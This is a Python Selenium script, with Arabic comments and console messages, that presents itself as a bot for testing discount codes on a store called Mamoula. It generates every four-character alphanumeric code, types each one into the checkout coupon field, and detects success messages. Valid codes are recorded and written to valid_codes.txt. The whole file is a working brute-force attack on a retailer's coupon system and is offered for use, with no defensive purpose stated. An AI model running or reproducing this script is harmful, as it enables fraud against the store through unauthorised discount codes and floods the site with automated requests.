from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import string
from itertools import product

# توليد الأكواد (0000 إلى ZZZZ)
codes = [''.join(p) for p in product(string.digits + string.ascii_uppercase, repeat=4)]

print("="*60)
print("🤖 بوت اختبار أكواد الخصم - مامولا")
print("="*60)
print(f"\n📊 عدد الأكواد: {len(codes):,}")
print("\n✅ الخطوات:")
print("1️⃣ افتح موقع مامولا")
print("2️⃣ أضف منتج للسلة")
print("3️⃣ اذهب لصفحة الدفع")
print("4️⃣ اضغط في حقل الكود")
print("5️⃣ اضغط Enter هنا\n")

input("👉 اضغط Enter لبدء البوت:")

# تشغيل Chrome
driver = webdriver.Chrome()
valid_codes = []

try:
    for idx, code in enumerate(codes, 1):
        try:
            # اكتب الكود في الحقل
            driver.switch_to.active_element.send_keys(code)
            time.sleep(0.1)
            
            # اضغط Tab للانتقال للزر
            driver.switch_to.active_element.send_keys(Keys.TAB)
            time.sleep(0.1)
            
            # اضغط Enter (تطبيق الكود)
            driver.switch_to.active_element.send_keys(Keys.ENTER)
            time.sleep(0.5)
            
            # تحقق من النجاح (ابحث عن رسالة نجاح)
            try:
                success_msg = driver.find_element("xpath", "//*[contains(text(), 'تم') or contains(text(), 'نجح') or contains(text(), 'تطبيق')]")
                valid_codes.append(code)
                print(f"✅ كود صحيح: {code}")
            except:
                pass
            
            # امسح الحقل للكود التالي
            driver.switch_to.active_element.send_keys(Keys.CONTROL + "a")
            driver.switch_to.active_element.send_keys(Keys.DELETE)
            time.sleep(0.1)
            
            # اطبع رسالة كل 500 كود
            if idx % 500 == 0:
                print(f"⏳ تم اختبار: {idx:,} كود")

        except Exception as e:
            print(f"❌ خطأ في الكود {idx}: {str(e)}")
            break

except KeyboardInterrupt:
    print(f"\n⛔ تم إيقاف البوت من قبل المستخدم")

finally:
    print("\n" + "="*60)
    print("✅ انتهى البوت!")
    print(f"📊 عدد الأكواد الصحيحة: {len(valid_codes)}")
    
    if valid_codes:
        print("\n🎯 الأكواد الصحيحة:")
        for code in valid_codes:
            print(f"  ✓ {code}")
        
        # حفظ الأكواد في ملف
        with open("valid_codes.txt", "w", encoding="utf-8") as f:
            for code in valid_codes:
                f.write(code + "\n")
        print(f"\n💾 تم حفظ الأكواد في: valid_codes.txt")
    else:
        print("\n⚠️ لم يتم العثور على أكواد صحيحة")
    
    print("="*60)
    driver.quit()
